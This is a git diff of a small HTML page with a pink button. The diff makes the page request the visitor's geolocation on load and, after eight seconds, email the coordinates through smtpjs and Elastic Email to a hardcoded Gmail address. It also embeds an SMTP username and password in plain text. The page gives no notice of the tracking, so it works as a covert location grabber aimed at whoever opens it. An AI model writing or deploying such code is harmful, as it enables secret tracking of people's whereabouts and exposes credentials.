@@ -1,74 +1,74 @@
 <!DOCTYPE html>
 <html>
-<body >
+
+<body>
 
 
-<button style="font-size: 42px; padding: 2% 4%; background: #fcafaf; border-radius: 14px;" onclick="getLocation()"> hy</button>
-<!-- smtpjs link
+    <button style="font-size: 42px; padding: 2% 4%; background: #fcafaf; border-radius: 14px;" onclick="getLocation()">
+        hy</button>
+    <!-- smtpjs link
    -->
-   <script src="https://smtpjs.com/v3/smtp.js">
-</script>
-<script>
-// const x = document.getElementById("demo");
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script>
+        // const x = document.getElementById("demo");
 
-// // function getLocation() {
-// //  
-// // }
-// var hamid;
-//  function showPosition(position) {
+        // // function getLocation() {
+        // //  
+        // // }
+        // var hamid;
+        //  function showPosition(position) {
 
-    
-//     hamid = navigator.geolocation.getCurrentPosition();
-// //   } else { 
-// //     x.innerHTML = "Geolocation is not supported by this browser.";
-// //   
-//         x.innerHTML = "Latitude: " + position.coords.latitude + 
-//   "<br>Longitude: " + position.coords.longitude;
-//   hamid = position.coords
-    
-// Global variable to store coordinates
-let userCoordinates = { latitude: null, longitude: null };
 
-function getLocation() {
-    if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                // Save the coordinates in the global variable
-                userCoordinates.latitude = position.coords.latitude;
-                userCoordinates.longitude = position.coords.longitude;
-                
-            },
-            (error) => {
-                console.error(`Error: ${error.message}`);
+        //     hamid = navigator.geolocation.getCurrentPosition();
+        // //   } else { 
+        // //     x.innerHTML = "Geolocation is not supported by this browser.";
+        // //   
+        //         x.innerHTML = "Latitude: " + position.coords.latitude + 
+        //   "<br>Longitude: " + position.coords.longitude;
+        //   hamid = position.coords
+
+        // Global variable to store coordinates
+        let userCoordinates = { latitude: null, longitude: null };
+
+     function getLocation() {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Save the coordinates in the global variable
+                        userCoordinates.latitude = position.coords.latitude;
+                        userCoordinates.longitude = position.coords.longitude;
+
+                    },
+                    (error) => {
+                        console.error(`Error: ${error.message}`);
+                    }
+                );
+            } else {
+                console.error('Geolocation is not supported by your browser.');
             }
-        );
-    } else {
-        console.error('Geolocation is not supported by your browser.');
-    }
-    console.log('hamid');
-}
-
-// Automatically run the function when the page is loaded
-// window.onload = getLocation;
-
-    (
-    Email.send({
-    Host : "smtp.elasticemail.com",
-    Username : "digicore@demo.com",
-    Password : "1DDE1DCBBAE04DC37822B18AF26B27F6C3E2",
-    To : 'mhamidabid301@gmail.com',
-    From : "mhamidabid301@gmail.com",
-    Subject : 'subject',
-    Body : userCoordinates
- 
- 
- 
-}))
+            console.log('hamid');
+        }
+       setTimeout(()=>{
+        Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "digicore@demo.com",
+                Password: "1DDE1DCBBAE04DC37822B18AF26B27F6C3E2",
+                To: 'mhamidabid301@gmail.com',
+                From: "mhamidabid301@gmail.com",
+                Subject: 'subject',
+                Body: userCoordinates
 
 
 
-</script>
+            })
+       },8000)
+
+        // Automatically run the function when the page is loaded
+        window.onload = getLocation;
+
+    </script>
 
 </body>
-</html>
 
+</html>
